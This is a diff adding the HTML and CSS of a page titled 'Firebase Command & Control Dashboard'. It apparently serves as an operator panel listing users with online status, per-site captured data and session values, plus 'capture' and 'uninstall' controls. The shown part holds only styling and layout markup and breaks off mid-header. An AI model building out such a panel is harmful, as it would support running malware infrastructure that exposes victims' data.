@@ -1,0 +1,2758 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Command & Control Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3a0ca3;
+            --success-color: #4cc9f0;
+            --danger-color: #612b43;
+            --warning-color: #f8961e;
+            --light-bg: #ffffff;
+            --light-card: #f8fafc;
+            --light-border: #e2e8f0;
+            --light-text: #1e293b;
+            --light-muted: #64748b;
+            --light-hover: #f1f5f9;
+            --dark-bg: #0f172a;
+            --dark-card: #1e293b;
+            --dark-border: #334155;
+            --dark-text: #f1f5f9;
+            --dark-muted: #94a3b8;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --shadow-hover: 0 10px 30px rgba(0, 0, 0, 0.12);
+            --border-radius: 12px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            color: var(--light-text);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body.dark-mode {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #0a0f1c 100%);
+            color: var(--dark-text);
+        }
+
+        .app-container {
+            display: flex;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* Sidebar (Users List) */
+        .sidebar {
+            width: 380px;
+            background: var(--light-bg);
+            border-right: 1px solid var(--light-border);
+            display: flex;
+            flex-direction: column;
+            transition: var(--transition);
+            z-index: 100;
+            box-shadow: 2px 0 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .dark-mode .sidebar {
+            background: var(--dark-card);
+            border-right-color: var(--dark-border);
+        }
+
+        .sidebar-header {
+            padding: 24px 20px;
+            border-bottom: 1px solid var(--light-border);
+            background: var(--light-bg);
+        }
+
+        .dark-mode .sidebar-header {
+            background: var(--dark-card);
+            border-bottom-color: var(--dark-border);
+        }
+
+        .sidebar-header h1 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 22px;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #4361ee, #3a0ca3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .connection-status {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 14px;
+            color: var(--light-muted);
+        }
+
+        .dark-mode .connection-status {
+            color: var(--dark-muted);
+        }
+
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #10b981;
+            animation: pulse 2s infinite;
+        }
+
+        .theme-toggle {
+            cursor: pointer;
+            padding: 5px 10px;
+            border-radius: 20px;
+            background: var(--light-hover);
+            transition: var(--transition);
+        }
+
+        .dark-mode .theme-toggle {
+            background: var(--dark-bg);
+        }
+
+        .theme-toggle:hover {
+            transform: scale(1.05);
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.7;
+                transform: scale(1.05);
+            }
+        }
+
+        .search-container {
+            padding: 15px 20px;
+            position: relative;
+        }
+
+        .search-container input {
+            width: 100%;
+            padding: 12px 15px 12px 45px;
+            background: var(--light-hover);
+            border: 1px solid var(--light-border);
+            border-radius: 30px;
+            color: var(--light-text);
+            font-size: 14px;
+            transition: var(--transition);
+        }
+
+        .dark-mode .search-container input {
+            background: var(--dark-bg);
+            border-color: var(--dark-border);
+            color: var(--dark-text);
+        }
+
+        .search-container input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            background: white;
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.1);
+        }
+
+        .dark-mode .search-container input:focus {
+            background: var(--dark-card);
+        }
+
+        .search-container i {
+            position: absolute;
+            left: 35px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--light-muted);
+        }
+
+        .dark-mode .search-container i {
+            color: var(--dark-muted);
+        }
+
+        .users-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+
+        .user-card {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            background: var(--light-card);
+            border-radius: var(--border-radius);
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: var(--transition);
+            border: 2px solid transparent;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .dark-mode .user-card {
+            background: var(--dark-bg);
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .user-card:hover {
+            background: var(--light-hover);
+            transform: translateX(5px);
+            box-shadow: var(--shadow);
+        }
+
+        .dark-mode .user-card:hover {
+            background: var(--dark-card);
+        }
+
+        .user-card.active {
+            background: rgba(67, 97, 238, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.1);
+        }
+
+        .dark-mode .user-card.active {
+            background: rgba(67, 97, 238, 0.2);
+        }
+
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            margin-right: 15px;
+            flex-shrink: 0;
+            color: white;
+            box-shadow: 0 4px 10px rgba(67, 97, 238, 0.3);
+        }
+
+        .user-info {
+            flex: 1;
+        }
+
+        .user-info h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .user-status {
+            font-size: 12px;
+            color: var(--light-muted);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .dark-mode .user-status {
+            color: var(--dark-muted);
+        }
+
+        .user-status .indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .user-status .indicator.online {
+            background: #10b981;
+            box-shadow: 0 0 10px #10b981;
+        }
+
+        .user-status .indicator.offline {
+            background: #ef4444;
+        }
+
+        .user-stats {
+            display: flex;
+            gap: 10px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .stat {
+            background: rgba(67, 97, 238, 0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--primary-color);
+            font-weight: 500;
+        }
+
+        /* Main Content (User Details) */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            transition: var(--transition);
+            position: relative;
+            background: var(--light-bg);
+            overflow: hidden;
+        }
+
+        .dark-mode .main-content {
+            background: var(--dark-bg);
+        }
+
+        .content-header {
+            padding: 20px 24px;
+            background: var(--light-bg);
+            border-bottom: 1px solid var(--light-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .dark-mode .content-header {
+            background: var(--dark-card);
+            border-bottom-color: var(--dark-border);
+        }
+
+        .back-button {
+            display: none;
+            background: var(--light-card);
+            border: 1px solid var(--light-border);
+            color: var(--light-text);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: var(--transition);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dark-mode .back-button {
+            background: var(--dark-bg);
+            border-color: var(--dark-border);
+            color: var(--dark-text);
+        }
+
+        .back-button:hover {
+            background: var(--light-hover);
+            transform: translateX(-2px);
+        }
+
+        .user-details-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .user-details-header .user-avatar {
+            width: 60px;
+            height: 60px;
+            font-size: 24px;
+        }
+
+        .user-details-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--light-text);
+        }
+
+        .dark-mode .user-details-header h2 {
+            color: var(--dark-text);
+        }
+
+        .user-meta {
+            display: flex;
+            gap: 15px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--light-muted);
+            background: var(--light-card);
+            padding: 5px 12px;
+            border-radius: 20px;
+        }
+
+        .dark-mode .meta-item {
+            background: var(--dark-bg);
+            color: var(--dark-muted);
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        /* Toggle Switch */
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--light-card);
+            padding: 5px 15px;
+            border-radius: 30px;
+            border: 1px solid var(--light-border);
+        }
+
+        .dark-mode .toggle-container {
+            background: var(--dark-bg);
+            border-color: var(--dark-border);
+        }
+
+        .toggle-label {
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--light-text);
+        }
+
+        .dark-mode .toggle-label {
+            color: var(--dark-text);
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 26px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #e2e8f0;
+            transition: var(--transition);
+            border-radius: 34px;
+        }
+
+        .dark-mode .toggle-slider {
+            background-color: var(--dark-border);
+        }
+
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: var(--transition);
+            border-radius: 50%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        input:checked+.toggle-slider {
+            background: linear-gradient(135deg, var(--success-color), #3a86ff);
+        }
+
+        input:checked+.toggle-slider:before {
+            transform: translateX(24px);
+        }
+
+        .uninstall-btn,
+        .capture-btn {
+            padding: 8px 16px;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: var(--transition);
+            font-size: 13px;
+        }
+
+        .uninstall-btn {
+            background: linear-gradient(135deg, #f97316, #dc2626);
+            box-shadow: 0 4px 15px rgba(249, 115, 22, 0.2);
+        }
+
+        .capture-btn {
+            background: linear-gradient(135deg, #4cc9f0, #4361ee);
+            box-shadow: 0 4px 15px rgba(76, 201, 240, 0.2);
+        }
+
+        .uninstall-btn:hover,
+        .capture-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(249, 115, 22, 0.3);
+        }
+
+        .Refresh-Data {
+            padding: 8px 16px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: var(--transition);
+            font-size: 13px;
+        }
+
+        .Refresh-Data:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .Refresh-Data:active i {
+            animation: rotate 0.5s linear;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Tab Navigation */
+        .tab-navigation {
+            display: flex;
+            gap: 10px;
+            padding: 15px 24px 0;
+            background: var(--light-bg);
+            border-bottom: 1px solid var(--light-border);
+        }
+
+        .dark-mode .tab-navigation {
+            background: var(--dark-card);
+            border-bottom-color: var(--dark-border);
+        }
+
+        .tab-btn {
+            padding: 10px 20px;
+            background: transparent;
+            border: none;
+            color: var(--light-muted);
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            border-bottom: 3px solid transparent;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .dark-mode .tab-btn {
+            color: var(--dark-muted);
+        }
+
+        .tab-btn:hover {
+            color: var(--primary-color);
+        }
+
+        .tab-btn.active {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        /* Data Content Area */
+        .data-content {
+            flex: 1;
+            padding: 24px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 24px;
+            align-content: flex-start;
+        }
+
+        .data-card {
+            background: var(--light-card);
+            border-radius: var(--border-radius);
+            transition: var(--transition);
+            border: 1px solid var(--light-border);
+            position: relative;
+            animation: cardAppear 0.4s ease-out;
+        }
+
+        .dark-mode .data-card {
+            background: var(--dark-card);
+            border-color: var(--dark-border);
+        }
+
+        @keyframes cardAppear {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .data-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-hover);
+            border-color: rgba(67, 97, 238, 0.2);
+        }
+
+        .card-header {
+            padding: 15px 20px;
+            background: rgba(67, 97, 238, 0.05);
+            border-bottom: 1px solid var(--light-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .dark-mode .card-header {
+            border-bottom-color: var(--dark-border);
+        }
+
+        .site-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .site-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .site-name {
+            font-weight: 600;
+            font-size: 16px;
+            color: var(--light-text);
+        }
+
+        .dark-mode .site-name {
+            color: var(--dark-text);
+        }
+
+        .site-url {
+            font-size: 12px;
+            color: var(--light-muted);
+            margin-top: 2px;
+            word-break: break-all;
+        }
+
+        .dark-mode .site-url {
+            color: var(--dark-muted);
+        }
+
+        .timestamp {
+            font-size: 12px;
+            color: var(--light-muted);
+            text-align: right;
+        }
+
+        .dark-mode .timestamp {
+            color: var(--dark-muted);
+        }
+
+        .card-body {
+            padding: 5px 10px;
+            overflow: scroll;
+            height: 300px;
+        }
+
+        .data-item {
+            background: white;
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: var(--transition);
+            border: 1px solid var(--light-border);
+        }
+
+        .dark-mode .data-item {
+            background: var(--dark-bg);
+            border-color: var(--dark-border);
+        }
+
+        .data-item:hover {
+            background: var(--light-hover);
+            border-color: rgba(67, 97, 238, 0.2);
+        }
+
+        .dark-mode .data-item:hover {
+            background: var(--dark-card);
+        }
+
+        .data-label {
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--light-muted);
+            min-width: 80px;
+        }
+
+        .dark-mode .data-label {
+            color: var(--dark-muted);
+        }
+
+        .data-value {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: var(--primary-color);
+            flex: 1;
+            text-align: right;
+            margin: 0 10px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 200px;
+        }
+
+        .data-actions {
+            display: flex;
+            gap: 5px;
+        }
+
+        .copy-btn,
+        .view-btn {
+            background: transparent;
+            border: 1px solid var(--light-border);
+            color: var(--light-muted);
+            cursor: pointer;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+
+        .dark-mode .copy-btn,
+        .dark-mode .view-btn {
+            border-color: var(--dark-border);
+            color: var(--dark-muted);
+        }
+
+        .copy-btn:hover {
+            background: rgba(76, 201, 240, 0.1);
+            border-color: var(--success-color);
+            color: var(--success-color);
+        }
+
+        .view-btn:hover {
+            background: rgba(67, 97, 238, 0.1);
+            border-color: var(--primary-color);
+            color: var(--primary-color);
+        }
+
+        .delete-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            opacity: 0;
+            z-index: 10;
+        }
+
+        .data-card:hover .delete-btn {
+            opacity: 1;
+        }
+
+        .delete-btn:hover {
+            background: rgba(239, 68, 68, 0.2);
+            transform: scale(1.1);
+        }
+
+        /* Sessions specific styles */
+        .session-data {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            background: var(--light-hover);
+            padding: 10px;
+            border-radius: 6px;
+            max-height: 200px;
+            overflow-y: auto;
+            word-break: break-all;
+            color: var(--light-text);
+            border: 1px solid var(--light-border);
+        }
+
+        .dark-mode .session-data {
+            background: var(--dark-bg);
+            color: var(--dark-text);
+            border-color: var(--dark-border);
+        }
+
+        .feedback-item {
+            padding: 10px;
+            border-left: 3px solid var(--primary-color);
+            background: var(--light-hover);
+            margin-bottom: 8px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .dark-mode .feedback-item {
+            background: var(--dark-bg);
+        }
+
+        .feedback-message {
+            font-size: 13px;
+            margin-bottom: 5px;
+        }
+
+        .feedback-meta {
+            font-size: 11px;
+            color: var(--light-muted);
+            display: flex;
+            gap: 10px;
+        }
+
+        .dark-mode .feedback-meta {
+            color: var(--dark-muted);
+        }
+
+        .command-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed var(--light-border);
+        }
+
+        .dark-mode .command-item {
+            border-bottom-color: var(--dark-border);
+        }
+
+        .command-label {
+            font-weight: 600;
+            color: var(--light-muted);
+        }
+
+        .command-value {
+            color: var(--primary-color);
+        }
+
+        .status-badge {
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .status-badge.online {
+            background: rgba(16, 185, 129, 0.1);
+            color: #10b981;
+        }
+
+        .status-badge.offline {
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+        }
+
+        .status-badge.active {
+            background: rgba(76, 201, 240, 0.1);
+            color: #4cc9f0;
+        }
+
+        /* No Data Message */
+        .no-data-message {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 60px 20px;
+            background: var(--light-card);
+            border-radius: var(--border-radius);
+            border: 2px dashed var(--light-border);
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .dark-mode .no-data-message {
+            background: var(--dark-card);
+            border-color: var(--dark-border);
+        }
+
+        .no-data-message i {
+            font-size: 60px;
+            color: rgba(67, 97, 238, 0.2);
+            margin-bottom: 20px;
+        }
+
+        .no-data-message h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: var(--light-text);
+        }
+
+        .dark-mode .no-data-message h3 {
+            color: var(--dark-text);
+        }
+
+        .no-data-message p {
+            color: var(--light-muted);
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .dark-mode .no-data-message p {
+            color: var(--dark-muted);
+        }
+
+        /* Welcome Screen */
+        .welcome-screen {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            padding: 40px;
+            text-align: center;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .welcome-content {
+            max-width: 600px;
+        }
+
+        .welcome-content i {
+            font-size: 80px;
+            color: var(--primary-color);
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, rgba(67, 97, 238, 0.1), rgba(58, 12, 163, 0.1));
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .welcome-content h1 {
+            font-size: 36px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #4361ee, #4cc9f0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .welcome-content p {
+            font-size: 18px;
+            color: var(--light-muted);
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .dark-mode .welcome-content p {
+            color: var(--dark-muted);
+        }
+
+        .stats-overview {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+
+        .stat-box {
+            background: white;
+            padding: 24px;
+            border-radius: var(--border-radius);
+            min-width: 150px;
+            border-top: 4px solid var(--primary-color);
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+
+        .dark-mode .stat-box {
+            background: var(--dark-card);
+        }
+
+        .stat-box:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-hover);
+        }
+
+        .stat-box h3 {
+            font-size: 32px;
+            margin-bottom: 5px;
+            color: var(--primary-color);
+        }
+
+        .stat-box p {
+            font-size: 14px;
+            color: var(--light-muted);
+        }
+
+        .dark-mode .stat-box p {
+            color: var(--dark-muted);
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: var(--transition);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: white;
+            border-radius: var(--border-radius);
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            transform: translateY(20px);
+            transition: var(--transition);
+        }
+
+        .dark-mode .modal {
+            background: var(--dark-card);
+        }
+
+        .modal-overlay.active .modal {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--light-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .dark-mode .modal-header {
+            border-bottom-color: var(--dark-border);
+        }
+
+        .modal-header h3 {
+            color: var(--light-text);
+        }
+
+        .dark-mode .modal-header h3 {
+            color: var(--dark-text);
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: var(--light-muted);
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+
+        .dark-mode .modal-close {
+            color: var(--dark-muted);
+        }
+
+        .modal-close:hover {
+            background: var(--light-hover);
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-field {
+            margin-bottom: 20px;
+        }
+
+        .modal-label {
+            font-weight: 600;
+            color: var(--light-muted);
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .dark-mode .modal-label {
+            color: var(--dark-muted);
+        }
+
+        .modal-value {
+            background: var(--light-card);
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            color: var(--light-text);
+            border: 1px solid var(--light-border);
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .dark-mode .modal-value {
+            background: var(--dark-bg);
+            color: var(--dark-text);
+            border-color: var(--dark-border);
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            border-left: 4px solid var(--success-color);
+            padding: 16px 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 1000;
+            max-width: 350px;
+            transform: translateX(400px);
+            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            border: 1px solid var(--light-border);
+        }
+
+        .dark-mode .notification {
+            background: var(--dark-card);
+            border-color: var(--dark-border);
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            border-left-color: #10b981;
+        }
+
+        .notification.error {
+            border-left-color: #ef4444;
+        }
+
+        .notification.warning {
+            border-left-color: #f59e0b;
+        }
+
+        .notification.info {
+            border-left-color: var(--primary-color);
+        }
+
+        .notification-icon {
+            font-size: 24px;
+        }
+
+        .notification.success .notification-icon {
+            color: #10b981;
+        }
+
+        .notification.error .notification-icon {
+            color: #ef4444;
+        }
+
+        .notification-content {
+            flex: 1;
+        }
+
+        .notification-content h4 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: var(--light-text);
+        }
+
+        .dark-mode .notification-content h4 {
+            color: var(--dark-text);
+        }
+
+        .notification-content p {
+            font-size: 14px;
+            color: var(--light-muted);
+        }
+
+        .dark-mode .notification-content p {
+            color: var(--dark-muted);
+        }
+
+        .close-notification {
+            background: none;
+            border: none;
+            color: var(--light-muted);
+            cursor: pointer;
+            font-size: 18px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+
+        .dark-mode .close-notification {
+            color: var(--dark-muted);
+        }
+
+        .close-notification:hover {
+            background: var(--light-hover);
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+        }
+
+        .loading-spinner i {
+            font-size: 40px;
+            color: var(--primary-color);
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 320px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .app-container {
+                flex-direction: column;
+            }
+
+            .sidebar {
+                width: 100%;
+                height: 70vh;
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 100;
+                transform: translateX(-100%);
+            }
+
+            .sidebar.active {
+                transform: translateX(0);
+            }
+
+            .main-content {
+                width: 100%;
+            }
+
+            .back-button {
+                display: flex;
+            }
+
+            .user-details-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+
+            .user-details-header h2 {
+                font-size: 20px;
+            }
+
+            .action-buttons {
+                width: 100%;
+                justify-content: flex-end;
+            }
+
+            .data-content {
+                grid-template-columns: 1fr;
+                padding: 15px;
+                gap: 15px;
+            }
+
+            .content-header {
+                padding: 15px;
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+
+            .tab-navigation {
+                padding: 10px 15px 0;
+                overflow-x: auto;
+            }
+
+            .tab-btn {
+                padding: 8px 15px;
+                font-size: 13px;
+                white-space: nowrap;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .sidebar-header h1 {
+                font-size: 18px;
+            }
+
+            .user-avatar {
+                width: 40px;
+                height: 40px;
+                font-size: 16px;
+            }
+
+            .user-info h3 {
+                font-size: 14px;
+            }
+
+            .welcome-content h1 {
+                font-size: 28px;
+            }
+
+            .welcome-content p {
+                font-size: 16px;
+            }
+
+            .stats-overview {
+                gap: 15px;
+            }
+
+            .stat-box {
+                min-width: 120px;
+                padding: 15px;
+            }
+
+            .stat-box h3 {
+                font-size: 24px;
+            }
+
+            .action-buttons {
+                gap: 8px;
+            }
+
+            .uninstall-btn,
+            .capture-btn,
+            .Refresh-Data {
+                padding: 6px 12px;
+                font-size: 12px;
+            }
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--light-hover);
+            border-radius: 10px;
+        }
+
+        .dark-mode ::-webkit-scrollbar-track {
+            background: var(--dark-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(67, 97, 238, 0.3);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(67, 97, 238, 0.5);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container">
+        <!-- Sidebar - Users List -->
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <h1><i class="fas fa-satellite-dish"></i> C&C Dashboard</h1>
+                <div class="connection-status">
+                    <div class="status-indicator"></div>
+                    <span id="connection-status-text">Connected</span>
+                    <div class="theme-toggle" onclick="toggleTheme()">
+                        <i class="fas fa-moon"></i>
+                    </div>
+                </div>
+            </div>
+
+            <div class="search-container">
+                <i class="fas fa-search"></i>
+                <input type="text" id="search-users" placeholder="Search users...">
+            </div>
+
+            <div class="users-list" id="users-list">
+                <div class="loading-spinner">
+                    <i class="fas fa-spinner fa-spin"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content Area -->
+        <div class="main-content" id="main-content">
+            <!-- Content Header -->
+            <div class="content-header">
+                <button class="back-button" id="back-button" onclick="showUsersList()">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+
+                <div class="user-details-header" id="user-details-header" style="display: none;">
+                    <div class="user-avatar" id="selected-user-avatar">U</div>
+                    <div>
+                        <h2 id="selected-user-name">User Name</h2>
